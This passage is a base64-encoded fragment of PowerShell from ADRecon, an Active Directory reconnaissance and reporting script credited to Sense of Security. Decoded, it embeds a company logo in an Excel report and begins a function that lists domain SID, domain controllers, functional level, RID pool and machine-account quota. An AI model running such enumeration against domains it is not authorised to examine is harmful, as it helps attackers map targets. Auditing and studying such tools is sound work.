icEZGVUFCdEZhQ3RPaDg5bkhVWWRlOSs2OTE3MzdyM1h2ZnV2ZGU5KzY5MTczN3IzWHZmdXZkZTkrNjkxNzM3cjNYdmZ1dmRlOSs2OTE3MzdyM1h2ZnV2ZGU5KzY5MTczN3IzWHZmdXZkZTkrNjkxNzM3cjNYdmZ1dmRlOSs2OTE3MzdyM1h2ZnV2ZGU5KzY5MTczN3IzWHZmdXZkZTkrNjkxNzM3cjNYdmZ1dmRlOSs2OTE3MzdyM1h2ZnV2ZGU5KzY5MTczN3IzWHZmdXZkZTkrNjkxNzM3cjNYdmZ1dmRlOSs2OTE3MzdyM1h2ZnV2ZGU5KzY5MTczN3IzWHZmdXZkZTkrNjkxNzM3cjNYdmZ1dmRlOSs2OTE3MzdyM1h2ZnV2ZGU5KzY5MTczN3IzWHZmdXZkZTkrNjkxNzM3cjNYdmZ1dmRlOSs2OTE3MzdyM1h2ZnV2ZGU5KzY5MTczN3IzWHZmdXZkZTkrNjkxNzM3cjNYdmZ1dmRlOSs2OTE3MzdyM1h2ZnV2ZGU5KzY5MTczN3IzUk12NWlmOEEyUW44dGY4QXhBdlkvd0Q3emxiN0RIT3YvS3Biai96eHkvOEFIVDFrRjkxSC93QVNXNUcvOFdldy93Q3I2ZGZQVjJ4c3JlVzlxNU1ac3phVzV0M1pLV1dPQ0xIN1l3T1Z6OWRKUE5xOFVLVW1LcGF1b2VXWFNkS2hidFkyOTRaMjlyZFhUK0hheHlTUDZJcFkvc0FQWDFTN3p6Rnkvd0F1V3h2T1liNnpzTFJWTEY3aWFPQkFCeEphVmxVQWVaclFkV1pmSFgrVFY4NCsvSzJpcU1yMXhKMGJzK1lvOVh1cnVjVlcxYXVLQzRhUktMWXdwNm5mVlhYTkNDWVZtb0tXbGRyQjZpSUhVQjNzdnRqelh2RGd5UWZTV3g0dlBWRCtVZERJVDZWVUQxWWRZZSs3SDk0RjkyLzJ3dDVJckhkeHpKdjYxQzIyMDZibFNmSXZlYWxzMVN2eEZacEpBS2xZbklvZHJqNEsvd0F0bm9mNEtZV3BxdG5wVmI1N1h6dEF1UDNYMjV1YWtwb00zVzBSZUdhYkM3YXhVRWxUUzdRMnpMVlFMSzFMRkxQVVR1cWZjMU5SNG9mSGtMeWx5UHRIS1VSYTJyTHVMaWp6TUJxSS9oVVpDTFhOQVNUalV6VUZPSW4zbGZ2ZCs1bjNsZHhTSGZ5bTI4a1cwdXUyMnkzWmpDajBJRTF4SVFyWFZ3RkpVU01xSWdMZURERnJrMTJHK3huMWlyMTczN3IzWHZmdXZkZTkrNjkxNzM3cjNYdmZ1dmRlOSs2OTE3MzdyM1h2ZnV2ZGU5KzY5MTczN3IzWHZmdXZkZTkrNjkxNzM3cjNYdmZ1dmRlOSs2OTE3MzdyM1h2ZnV2ZGU5KzY5MTczN3IzWHZmdXZkZTkrNjkxNzM3cjNYdmZ1dmRlOSs2OTE3MzdyM1h2ZnV2ZGU5KzY5MTczN3IzWHZmdXZkZTkrNjkxNzM3cjNYdmZ1dmRlOSs2OTE3MzdyM1h2ZnV2ZGU5KzY5MTczN3IzWHZmdXZkZTkrNjkxNzM3cjNYdmZ1dmRlOSs2OTE3MzdyM1h2ZnV2ZGU5KzY5MTczN3IzWHZmdXZkZTkrNjkxNzM3cjNYdmZ1dmRlOSs2OTE3MzdyM1h2ZnV2ZGU5KzY5MTczN3IzWHZmdXZkZTkrNjkxNzM3cjNYdmZ1dmRlOSs2OTE3MzdyM1h2ZnV2ZGU5KzY5MTczN3IzWHZmdXZkZTkrNjkxNzM3cjNYdmZ1dmRlOSs2OTBuOTFmOEFIdTViL3FGUC9RNmUyWi83RnZzNk05bS81S2tIK242VUh0N29zNjk3OTE3cjN2M1h1dmUvZGU2OTc5MTdyM3YzWHV2ZS9kZTY5NzkxN3IzdjNYdXYvOWs9IgoKICAgICAgICAkYnl0ZXMgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRiYXNlNjRzb3MpCiAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIGJhc2U2NHNvcwoKICAgICAgICAkQ29tcGFueUxvZ28gPSAtam9pbigkUmVwb3J0UGF0aCwnXCcsJ1NPU19Mb2dvLmpwZycpCgkJJHAgPSBOZXctT2JqZWN0IElPLk1lbW9yeVN0cmVhbSgkYnl0ZXMsIDAsICRieXRlcy5sZW5ndGgpCgkJJHAuV3JpdGUoJGJ5dGVzLCAwLCAkYnl0ZXMubGVuZ3RoKQogICAgICAgIEFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLkRyYXdpbmcKCQkkcGljdHVyZSA9IFtTeXN0ZW0uRHJhd2luZy5JbWFnZV06OkZyb21TdHJlYW0oJHAsICR0cnVlKQoJCSRwaWN0dXJlLlNhdmUoJENvbXBhbnlMb2dvKQoKICAgICAgICBSZW1vdmUtVmFyaWFibGUgYnl0ZXMKICAgICAgICBSZW1vdmUtVmFyaWFibGUgcAogICAgICAgIFJlbW92ZS1WYXJpYWJsZSBwaWN0dXJlCgogICAgICAgICRMaW5rVG9GaWxlID0gJGZhbHNlCiAgICAgICAgJFNhdmVXaXRoRG9jdW1lbnQgPSAkdHJ1ZQogICAgICAgICRMZWZ0ID0gMAogICAgICAgICRUb3AgPSAwCiAgICAgICAgJFdpZHRoID0gMTM1CiAgICAgICAgJEhlaWdodCA9IDUwCgogICAgICAgICMgQWRkIGltYWdlIHRvIHRoZSBTaGVldAogICAgICAgICR3b3Jrc2hlZXQuU2hhcGVzLkFkZFBpY3R1cmUoJENvbXBhbnlMb2dvLCAkTGlua1RvRmlsZSwgJFNhdmVXaXRoRG9jdW1lbnQsICRMZWZ0LCAkVG9wLCAkV2lkdGgsICRIZWlnaHQpIHwgT3V0LU51bGwKCiAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIExpbmtUb0ZpbGUKICAgICAgICBSZW1vdmUtVmFyaWFibGUgU2F2ZVdpdGhEb2N1bWVudAogICAgICAgIFJlbW92ZS1WYXJpYWJsZSBMZWZ0CiAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIFRvcAogICAgICAgIFJlbW92ZS1WYXJpYWJsZSBXaWR0aAogICAgICAgIFJlbW92ZS1WYXJpYWJsZSBIZWlnaHQKCiAgICAgICAgSWYgKFRlc3QtUGF0aCAtUGF0aCAkQ29tcGFueUxvZ28pCiAgICAgICAgewogICAgICAgICAgICBSZW1vdmUtSXRlbSAkQ29tcGFueUxvZ28KICAgICAgICB9CiAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIENvbXBhbnlMb2dvCgogICAgICAgICRyb3cgPSA1CiAgICAgICAgJGNvbHVtbiA9IDEKICAgICAgICAkd29ya3NoZWV0LkNlbGxzLkl0ZW0oJHJvdywkY29sdW1uKT0gIlRhYmxlIG9mIENvbnRlbnRzIgogICAgICAgICR3b3Jrc2hlZXQuQ2VsbHMuSXRlbSgkcm93LCRjb2x1bW4pLlN0eWxlID0gIkhlYWRpbmcgMiIKICAgICAgICAkcm93KysKCiAgICAgICAgRm9yKCRpPTI7ICRpIC1sZSAkd29ya2Jvb2suV29ya3NoZWV0cy5Db3VudDsgJGkrKykKICAgICAgICB7CiAgICAgICAgICAgICR3b3JrYm9vay5Xb3Jrc2hlZXRzLkl0ZW0oMSkuSHlwZXJsaW5rcy5BZGQoJHdvcmtib29rLldvcmtzaGVldHMuSXRlbSgxKS5DZWxscy5JdGVtKCRyb3csJGNvbHVtbikgLCAiIiAsICInJCgkd29ya2Jvb2suV29ya3NoZWV0cy5JdGVtKCRpKS5OYW1lKSchQTEiLCAiIiwgJHdvcmtib29rLldvcmtzaGVldHMuSXRlbSgkaSkuTmFtZSkgfCBPdXQtTnVsbAogICAgICAgICAgICAkcm93KysKICAgICAgICB9CgogICAgICAgICRyb3crKwogICAgICAgICR3b3Jrc2hlZXQuQ2VsbHMuSXRlbSgkcm93LCAxKSA9ICLCqSBTZW5zZSBvZiBTZWN1cml0eSAyMDE4IgogICAgICAgICR3b3JrYm9vay5Xb3Jrc2hlZXRzLkl0ZW0oMSkuSHlwZXJsaW5rcy5BZGQoJHdvcmtib29rLldvcmtzaGVldHMuSXRlbSgxKS5DZWxscy5JdGVtKCRyb3csMikgLCAiaHR0cHM6Ly93d3cuc2Vuc2VvZnNlY3VyaXR5LmNvbS5hdSIsICIiICwgIiIsICJ3d3cuc2Vuc2VvZnNlY3VyaXR5LmNvbS5hdSIpIHwgT3V0LU51bGwKCiAgICAgICAgJHdvcmtzaGVldC5Vc2VkUmFuZ2UuRW50aXJlQ29sdW1uLkF1dG9GaXQoKSB8IE91dC1OdWxsCgogICAgICAgICRleGNlbC5XaW5kb3dzLkl0ZW0oMSkuRGlzcGxheWdyaWRsaW5lcyA9ICRmYWxzZQogICAgICAgICRleGNlbC5TY3JlZW5VcGRhdGluZyA9ICR0cnVlCiAgICAgICAgJEFEU3RhdEZpbGVOYW1lID0gLWpvaW4oJEV4Y2VsUGF0aCwnXCcsJERvbWFpbk5hbWUsJ0FEUmVjb24tUmVwb3J0Lnhsc3gnKQogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgIyBEaXNhYmxlIHByb21wdCBpZiBmaWxlIGV4aXN0cwogICAgICAgICAgICAkZXhjZWwuRGlzcGxheUFsZXJ0cyA9ICRGYWxzZQogICAgICAgICAgICAkd29ya2Jvb2suU2F2ZUFzKCRBRFN0YXRGaWxlTmFtZSkKICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJbK10gRXhjZWxzaGVldCBTYXZlZCB0bzogJEFEU3RhdEZpbGVOYW1lIgogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtRXJyb3IgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgIH0KICAgICAgICAkZXhjZWwuUXVpdCgpCiAgICAgICAgR2V0LUFEUkV4Y2VsQ29tT2JqUmVsZWFzZSAtQ29tT2JqdG9SZWxlYXNlICR3b3Jrc2hlZXQgLUZpbmFsICR0cnVlCiAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIHdvcmtzaGVldAogICAgICAgIEdldC1BRFJFeGNlbENvbU9ialJlbGVhc2UgLUNvbU9ianRvUmVsZWFzZSAkd29ya2Jvb2sgLUZpbmFsICR0cnVlCiAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIC1OYW1lIHdvcmtib29rIC1TY29wZSBHbG9iYWwKICAgICAgICBHZXQtQURSRXhjZWxDb21PYmpSZWxlYXNlIC1Db21PYmp0b1JlbGVhc2UgJGV4Y2VsIC1GaW5hbCAkdHJ1ZQogICAgICAgIFJlbW92ZS1WYXJpYWJsZSAtTmFtZSBleGNlbCAtU2NvcGUgR2xvYmFsCiAgICB9Cn0KCkZ1bmN0aW9uIEdldC1BRFJEb21haW4Kewo8IwouU1lOT1BTSVMKICAgIFJldHVybnMgaW5mb3JtYXRpb24gb2YgdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluLgoKLkRFU0NSSVBUSU9OCiAgICBSZXR1cm5zIGluZm9ybWF0aW9uIG9mIHRoZSBjdXJyZW50IChvciBzcGVjaWZpZWQpIGRvbWFpbi4KCi5QQVJBTUVURVIgUHJvdG9jb2wKICAgIFtzdHJpbmddCiAgICBXaGljaCBwcm90b2NvbCB0byB1c2U7IEFEV1MgKGRlZmF1bHQpIG9yIExEQVAuCgouUEFSQU1FVEVSIG9iakRvbWFpbgogICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XQogICAgRG9tYWluIERpcmVjdG9yeSBFbnRyeSBvYmplY3QuCgouUEFSQU1FVEVSIG9iakRvbWFpblJvb3REU0UKICAgIFtEaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeV0KICAgIFJvb3REU0UgRGlyZWN0b3J5IEVudHJ5IG9iamVjdC4KCi5QQVJBTUVURVIgRG9tYWluQ29udHJvbGxlcgogICAgW3N0cmluZ10KICAgIElQIEFkZHJlc3Mgb2YgdGhlIERvbWFpbiBDb250cm9sbGVyLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCiAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgIENyZWRlbnRpYWxzLgoKLk9VVFBVVFMKICAgIFBTT2JqZWN0LgojPgogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW3N0cmluZ10gJFByb3RvY29sLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XSAkb2JqRG9tYWluLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XSAkb2JqRG9tYWluUm9vdERTRSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtzdHJpbmddICREb21haW5Db250cm9sbGVyLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIElmICgkUHJvdG9jb2wgLWVxICdBRFdTJykKICAgIHsKICAgICAgICBUcnkKICAgICAgICB7CiAgICAgICAgICAgICRBRERvbWFpbiA9IEdldC1BRERvbWFpbgogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJEb21haW5dIEVycm9yIGdldHRpbmcgRG9tYWluIENvbnRleHQiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CiAgICAgICAgSWYgKCRBRERvbWFpbikKICAgICAgICB7CiAgICAgICAgICAgICREb21haW5PYmogPSBAKCkKCiAgICAgICAgICAgICMgVmFsdWVzIHRha2VuIGZyb20gaHR0cHM6Ly90ZWNobmV0Lm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9oaDg1MjI4MSh2PXdwcy42MzApLmFzcHgKICAgICAgICAgICAgJEZMQUQgPSBAewoJICAgICAgICAgICAgMCA9ICJXaW5kb3dzMjAwMCI7CgkgICAgICAgICAgICAxID0gIldpbmRvd3MyMDAzL0ludGVyaW0iOwoJICAgICAgICAgICAgMiA9ICJXaW5kb3dzMjAwMyI7CgkgICAgICAgICAgICAzID0gIldpbmRvd3MyMDA4IjsKCSAgICAgICAgICAgIDQgPSAiV2luZG93czIwMDhSMiI7CgkgICAgICAgICAgICA1ID0gIldpbmRvd3MyMDEyIjsKCSAgICAgICAgICAgIDYgPSAiV2luZG93czIwMTJSMiI7CgkgICAgICAgICAgICA3ID0gIldpbmRvd3MyMDE2IgogICAgICAgICAgICB9CiAgICAgICAgICAgICREb21haW5Nb2RlID0gJEZMQURbW2NvbnZlcnRdOjpUb0ludDMyKCRBRERvbWFpbi5Eb21haW5Nb2RlKV0gKyAiRG9tYWluIgogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgRkxBRAogICAgICAgICAgICBJZiAoLU5vdCAkRG9tYWluTW9kZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJERvbWFpbk1vZGUgPSAkQUREb21haW4uRG9tYWluTW9kZQogICAgICAgICAgICB9CgogICAgICAgICAgICAkT2JqVmFsdWVzID0gQCgiTmFtZSIsICRBRERvbWFpbi5ETlNSb290LCAiTmV0QklPUyIsICRBRERvbWFpbi5OZXRCSU9TTmFtZSwgIkZ1bmN0aW9uYWwgTGV2ZWwiLCAkRG9tYWluTW9kZSwgIkRvbWFpblNJRCIsICRBRERvbWFpbi5Eb21haW5TSUQuVmFsdWUpCgogICAgICAgICAgICBGb3IgKCRpID0gMDsgJGkgLWx0ICQoJE9ialZhbHVlcy5Db3VudCk7ICRpKyspCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRPYmogPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkNhdGVnb3J5IiAtVmFsdWUgJE9ialZhbHVlc1skaV0KICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVmFsdWUiIC1WYWx1ZSAkT2JqVmFsdWVzWyRpKzFdCiAgICAgICAgICAgICAgICAkaSsrCiAgICAgICAgICAgICAgICAkRG9tYWluT2JqICs9ICRPYmoKICAgICAgICAgICAgfQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgRG9tYWluTW9kZQoKICAgICAgICAgICAgRm9yKCRpPTA7ICRpIC1sdCAkQUREb21haW4uUmVwbGljYURpcmVjdG9yeVNlcnZlcnMuQ291bnQ7ICRpKyspCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRPYmogPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkNhdGVnb3J5IiAtVmFsdWUgIkRvbWFpbiBDb250cm9sbGVyIgogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJWYWx1ZSIgLVZhbHVlICRBRERvbWFpbi5SZXBsaWNhRGlyZWN0b3J5U2VydmVyc1skaV0KICAgICAgICAgICAgICAgICREb21haW5PYmogKz0gJE9iagogICAgICAgICAgICB9CiAgICAgICAgICAgIEZvcigkaT0wOyAkaSAtbHQgJEFERG9tYWluLlJlYWRPbmx5UmVwbGljYURpcmVjdG9yeVNlcnZlcnMuQ291bnQ7ICRpKyspCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRPYmogPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkNhdGVnb3J5IiAtVmFsdWUgIlJlYWQgT25seSBEb21haW4gQ29udHJvbGxlciIKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVmFsdWUiIC1WYWx1ZSAkQUREb21haW4uUmVhZE9ubHlSZXBsaWNhRGlyZWN0b3J5U2VydmVyc1skaV0KICAgICAgICAgICAgICAgICREb21haW5PYmogKz0gJE9iagogICAgICAgICAgICB9CgogICAgICAgICAgICBUcnkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEFERm9yZXN0ID0gR2V0LUFERm9yZXN0ICRBRERvbWFpbi5Gb3Jlc3QKICAgICAgICAgICAgfQogICAgICAgICAgICBDYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LUFEUkRvbWFpbl0gRXJyb3IgZ2V0dGluZyBGb3Jlc3QgQ29udGV4dCIKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICB9CgogICAgICAgICAgICBJZiAoLU5vdCAkQURGb3Jlc3QpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRBREZvcmVzdCA9IEdldC1BREZvcmVzdCAtU2VydmVyICREb21haW5Db250cm9sbGVyCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBDYXRjaAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSRG9tYWluXSBFcnJvciBnZXR0aW5nIEZvcmVzdCBDb250ZXh0IgogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIElmICgkQURGb3Jlc3QpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICREb21haW5DcmVhdGlvbiA9IEdldC1BRE9iamVjdCAtU2VhcmNoQmFzZSAiJCgkQURGb3Jlc3QuUGFydGl0aW9uc0NvbnRhaW5lcikiIC1MREFQRmlsdGVyICIoJihvYmplY3RDbGFzcz1jcm9zc1JlZikoc3lzdGVtRmxhZ3M9MykoTmFtZT0kKCRBRERvbWFpbi5OYW1lKSkpIiAtUHJvcGVydGllcyB3aGVuQ3JlYXRlZAogICAgICAgICAgICAgICAgSWYgKC1Ob3QgJERvbWFpbkNyZWF0aW9uKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICREb21haW5DcmVhdGlvbiA9IEdldC1BRE9iamVjdCAtU2VhcmNoQmFzZSAiJCgkQURGb3Jlc3QuUGFydGl0aW9uc0NvbnRhaW5lcikiIC1MREFQRmlsdGVyICIoJihvYmplY3RDbGFzcz1jcm9zc1JlZikoc3lzdGVtRmxhZ3M9MykoTmFtZT0kKCRBRERvbWFpbi5OZXRCSU9TTmFtZSkpKSIgLVByb3BlcnRpZXMgd2hlbkNyZWF0ZWQKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBREZvcmVzdAogICAgICAgICAgICB9CiAgICAgICAgICAgICMgR2V0IFJJREF2YWlsYWJsZVBvb2wKICAgICAgICAgICAgVHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRSSURNYW5hZ2VyID0gR2V0LUFET2JqZWN0IC1JZGVudGl0eSAiQ049UklEIE1hbmFnZXIkLENOPVN5c3RlbSwkKCRBRERvbWFpbi5EaXN0aW5ndWlzaGVkTmFtZSkiIC1Qcm9wZXJ0aWVzIHJJREF2YWlsYWJsZVBvb2wKICAgICAgICAgICAgICAgICRSSURwcm9wZXJ0eSA9ICRSSURNYW5hZ2VyLnJJREF2YWlsYWJsZVBvb2wKICAgICAgICAgICAgICAgIFtpbnQzMl0gJHRvdGFsU0lEUyA9ICQoJFJJRHByb3BlcnR5KSAvIChbbWF0aF06OlBvdygyLDMyKSkKICAgICAgICAgICAgICAgIFtpbnQ2NF0gJHRlbXA2NHZhbCA9ICR0b3RhbFNJRFMgKiAoW21hdGhdOjpQb3coMiwzMikpCiAgICAgICAgICAgICAgICAkUklEc0lzc3VlZCA9IFtpbnQzMl0oJCgkUklEcHJvcGVydHkpIC0gJHRlbXA2NHZhbCkKICAgICAgICAgICAgICAgICRSSURzUmVtYWluaW5nID0gJHRvdGFsU0lEUyAtICRSSURzSXNzdWVkCiAgICAgICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgUklETWFuYWdlcgogICAgICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIFJJRHByb3BlcnR5CiAgICAgICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgdG90YWxTSURTCiAgICAgICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgdGVtcDY0dmFsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJEb21haW5dIEVycm9yIGFjY2Vzc2luZyBDTj1SSUQgTWFuYWdlciQsQ049U3lzdGVtLCQoJEFERG9tYWluLkRpc3Rpbmd1aXNoZWROYW1lKSIKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICB9CiAgICAgICAgICAgIElmICgkRG9tYWluQ3JlYXRpb24pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRPYmogPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkNhdGVnb3J5IiAtVmFsdWUgIkNyZWF0aW9uIERhdGUiCiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIlZhbHVlIiAtVmFsdWUgJERvbWFpbkNyZWF0aW9uLndoZW5DcmVhdGVkCiAgICAgICAgICAgICAgICAkRG9tYWluT2JqICs9ICRPYmoKICAgICAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBEb21haW5DcmVhdGlvbgogICAgICAgICAgICB9CgogICAgICAgICAgICAkT2JqID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkNhdGVnb3J5IiAtVmFsdWUgIm1zLURTLU1hY2hpbmVBY2NvdW50UXVvdGEiCiAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVmFsdWUiIC1WYWx1ZSAkKChHZXQtQURPYmplY3QgLUlkZW50aXR5ICgkQUREb21haW4uRGlzdGluZ3Vpc2hlZE5hbWUpIC1Qcm9wZXJ0aWVzIG1zLURTLU1hY2hpbmVBY2NvdW50UXVvdGEpLidtcy1EUy1NYWNoaW5lQWNjb3VudFF1b3RhJykKICAgICAgICAgICAgJERvbWFpbk9iaiArPSAkT2JqCgogICAgICAgICAgICBJZiAoJFJJRHNJc3N1ZWQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRPYmogPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkNhdGVnb3J5IiAtVmFsdWUgIlJJRHMgSXNzdWVkIgogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJWYWx1ZSIgLVZhbHVlICRSSURzSXNzdWVkCiAgICAgICAgICAgICAgICAkRG9tYWluT2JqICs9ICRPYmoKICAgICAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBSSURzSXNzdWVkCiAgICAgICAgICAgIH0KICAgICAgICAgICAgSWYgKCRSSURzUmVtYWluaW5nKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkT2JqID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJDYXRlZ29yeSIgLVZhbHVlICJSSURzIFJlbWFpbmluZyIKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVmFsdWUiIC1WYWx1ZSAkUklEc1JlbWFpbmluZwogICAgICAgICAgICAgICAgJERvbWFpbk9iaiArPSAkT2JqCiAgICAgICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgUklEc1JlbWFpbmluZwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIElmICgkUHJvdG9jb2wgLWVxICdMREFQJykKICAgIHsKICAgICAgICBJZiAoJENyZWRlbnRpYWwgLW5lIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkpCiAgICAgICAgewogICAgICAgICAgICAkRG9tYWluRlFETiA9IEdldC1ETnRvRlFETigkb2JqRG9tYWluLmRpc3Rpbmd1aXNoZWROYW1lKQogICAgICAgICAgICAkRG9tYWluQ29udGV4dCA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5EaXJlY3RvcnlDb250ZXh0KCJEb21haW4iLCQoJERvbWFpbkZRRE4pLCQoJENyZWRlbnRpYWwuVXNlck5hbWUpLCQoJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5wYXNzd29yZCkpCiAgICAgICAgICAgIFRyeQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkQUREb21haW4gPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Eb21haW5dOjpHZXREb21haW4oJERvbWFpbkNvbnRleHQpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJEb21haW5dIEVycm9yIGdldHRpbmcgRG9tYWluIENvbnRleHQiCiAgICAgICAg